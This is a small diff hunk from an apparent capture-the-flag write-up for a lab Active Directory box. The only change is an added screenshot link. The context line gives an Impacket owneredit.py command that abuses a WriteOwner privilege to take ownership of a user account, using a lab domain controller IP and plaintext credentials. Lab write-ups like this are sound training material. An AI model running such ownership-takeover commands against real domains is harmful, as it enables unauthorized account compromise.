@@ -52,7 +52,7 @@
 
 8. Sam has WriteOwner privilege on John. Change John's owner to Sam using Impacket's owneredit.py script
 `sudo python3 /usr/lib/python3/dist-packages/impacket/examples/owneredit.py -action write  -target 'John' -dc-ip 10.129.47.3 -new-owner 'sam' 'tombwatcher.htb'/'sam':'Password1'` 
-
+![image](https://github.com/user-attachments/assets/7aaa18a9-d749-4a41-9860-1e97ad98812f)
 
 9. 
 
